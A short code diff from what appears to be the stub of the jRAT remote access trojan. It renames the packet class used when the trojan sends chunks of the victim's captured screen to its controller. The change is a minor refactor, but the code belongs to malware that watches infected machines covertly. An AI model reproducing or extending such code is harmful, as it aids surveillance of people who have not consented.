@@ -16,7 +16,7 @@ import javax.imageio.ImageIO;
 
 import se.jrat.common.utils.ImageUtils;
 import se.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
-import se.jrat.stub.packets.outgoing.Packet17RemoteScreen;
+import se.jrat.stub.packets.outgoing.Packet26RemoteScreen;
 import se.jrat.stub.packets.outgoing.Packet33Thumbnail;
 import se.jrat.stub.packets.outgoing.Packet68RemoteScreenComplete;
 
@@ -139,7 +139,7 @@ public class Screen implements Runnable {
 					prevSums[is++] = i;
 
 					if (update) {
-						packet = new Packet17RemoteScreen(chunkWidth, chunkHeight, x, y, image.getWidth(), image.getHeight(), buffer);
+						packet = new Packet26RemoteScreen(chunkWidth, chunkHeight, x, y, image.getWidth(), image.getHeight(), buffer);
 
 						packet.send(Connection.dos, Connection.sw);
 					}
